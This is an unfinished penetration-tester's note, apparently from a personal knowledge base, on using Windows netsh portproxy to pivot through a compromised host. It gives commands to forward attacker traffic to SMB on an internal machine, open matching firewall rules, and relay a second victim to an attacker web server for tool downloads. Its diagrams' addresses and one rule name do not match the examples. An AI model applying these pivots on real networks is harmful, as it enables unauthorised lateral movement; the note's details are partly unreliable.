
> [!info]
> This note is still in development.
## Overview
---
**Netsh** is a command-line scripting utility that allows you to display or modify network configuration settings. The **portproxy** function within Netsh enables you to configure port forwarding and address translation for network traffic between different systems, facilitating routing and redirection of network traffic from one port to another.

## Usage
---
### Port Forwarding

`netsh` can be utilized to port forward on Windows clients.

```powershell
# Victim: Port forward on Client pointing towards a second target
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=<local_port> connectaddress=<destination_host> connectport=<destination_port>

# Victim: Add a Firewall rule to allow traffic through open port
netsh advfirewall firewall add rule name="Example Port Forward" dir=in action=allow protocol=TCP localport=<local_port>
```

**Visual Diagram:**

```mermaid
flowchart LR

A{Attacker<br>10.10.1.10}
B{Client 1<br>10.10.1.10<br>192.168.1.10}
C{Client 2<br>192.168.1.11}

A --> | Step 2:<br>10.10.1.10:6969 | B
B --> | Step 1:<br>0.0.0.0:6969 -> 192.168.1.11:445 | C
```
(Note: in the above example, Client 1 established a local port forward redirecting to )

### Old Shit
Below is port forwarding syntax allowing us to forward traffic back to a port on our attacker (e.g., access to a simple web server hosting tools)

```powershell
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=<client_port> connectaddress=<attacker_ip> connectport=<attacker_port>
```


Above code would be running on a compromised <client_01> and allow <client_02> to reach a specified port on our attacker box. 

Shitty Diagram Below:
```
	                    | FW |
<client_02> ---> <client_01>:<port> ---> <attacker_ip><port>
						| FW |
```


**Diagram V2:**

```powershell
# Attacker: 192.168.1.10 | Client 1: 192.168.1.11, 10.10.10.11 | Client 2: 10.10.10.12 

# Port forward on Client 1 allowing attacker to reach port 445 on Client 2
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=6969 connectaddress=10.10.10.12 connectport=445

netsh advfirewall firewall add rule name="Example Port Forward" dir=in action=allow protocol=TCP localport=6969

# Result: Attacker can now reach Client 2 (10.10.10.12:445) by hitting Client 1 (192.168.1.11:6969) | Pending Firewall


# Port forward allowing Client 2 to download files from an Attacker web server
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=6969 connectaddress=192.168.1.10 connectport=80
# Client 2 can now pull files from an Attacker web server (192.168.1.10:80) by hitting Client 1 (10.10.10.11:6969) | Pending Firewall
```

### Examples

- **Attacker**: 192.168.1.10
- **Client 1 (Dual NIC'd)**: 192.168.1.11, 10.10.10.11
- **Client 2**: 10.10.10.12

**Example 1**: 

```powershell
# Victim: Port forward on Client 1 allowing Attacker to reach port 445 on Client 2
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=<local_port> connectaddress=<destination_host> connectport=<destination_port>

# Victim: Add a Firewall rule to allow traffic through open port
netsh advfirewall firewall add rule name="Example Port Forward" dir=in action=allow protocol=TCP localport=<local_port>

# Attacker: Access
```

**Visual Diagram:**

```mermaid
flowchart LR

A{Attacker<br>10.10.1.10}
B{Client 1<br>10.10.1.10<br>192.168.1.10}
C{Client 2<br>192.168.1.11}

A --> | Step 2:<br>10.10.1.10:6969 | B
B --> | Step 1:<br>0.0.0.0:6969 -> 192.168.1.11:445 | C
```

**Example 2:**

```powershell
# Port forward allowing Client 2 to download files from an Attacker web server
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=6969 connectaddress=192.168.1.10 connectport=80

# Add a Firewall rule to allow traffic through open port
netsh advfirewall firewall add rule name="Example Port Forward" dir=in action=allow protocol=TCP localport=6969

# Remove port proxy
netsh interface portproxy delete v4tov4 listenport=6969
# Remove firewall rule
netsh advfirewall firewall delete rule name="Proxy all the things"
```

- Mermaid Diagram:
```mermaid
flowchart RL

A{Client 2}
B(to)
C{Client 1}
D(to)
E{Attacker}

A --> | IP: 10.10.10.12 | B
B --> | IP: 10.10.10.11 | C
B --> | Port: 6969 | C
C --> | IP: 192.168.1.11 | D
D --> | IP: 192.168.1.10 | E
D --> | Port: 80 | E
```

- Shitty ASCII Diagram:
```
	                    | FW |
<client_02> ---> <client_01>:<port> ---> <attacker_ip><port>
						| FW |
```

